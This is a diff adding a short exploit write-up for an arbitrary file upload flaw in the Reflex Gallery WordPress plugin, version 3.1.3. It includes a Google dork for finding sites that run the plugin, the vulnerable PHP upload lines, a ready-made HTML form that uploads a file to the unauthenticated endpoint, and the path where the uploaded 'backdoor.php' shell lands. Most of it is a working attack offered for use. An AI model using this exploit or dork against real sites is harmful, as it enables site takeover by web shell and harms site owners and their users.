@@ -1,0 +1,28 @@
+# Exploit Title: Wordpress Plugin Reflex Gallery - Arbitrary File Upload
+# Google Dork: inurl:wp-content/plugins/reflex-gallery/
+# Date: 08.03.2015
+# Exploit Author: CrashBandicot @DosPerl
+# Vendor Homepage: https://wordpress.org/plugins/reflex-gallery/
+# Software Link: https://downloads.wordpress.org/plugin/reflex-gallery.zip
+# Version: 3.1.3 (Last)
+# Tested on: Windows
+ 
+# p0C : http://i.imgur.com/mj8yADU.png
+ 
+# Path : wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php
+# add Month and Year in GET for Folder of Shell ./wp-content/uploads/" .$_GET['Year'].'/'.$_GET['Month']. "
+  
+Vulnerable File : php.php
+50.      if(!move_uploaded_file($_FILES['qqfile']['tmp_name'], $path)){
+173.         $result = $uploader->handleUpload('../../../../../uploads/'.$_GET['Year'].'/'.$_GET['Month'].'/');
+ 
+ 
+# Exploit :
+ 
+<form method="POST" action="http://127.0.0.1:1337/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2015&Month=03" enctype="multipart/form-data" >
+    <input type="file" name="qqfile"><br>
+    <input type="submit" name="Submit" value="Pwn!">
+</form>
+ 
+ 
+# Shell Path : http://127.0.0.1:1337/wordpress/wp-content/uploads/2015/03/backdoor.php
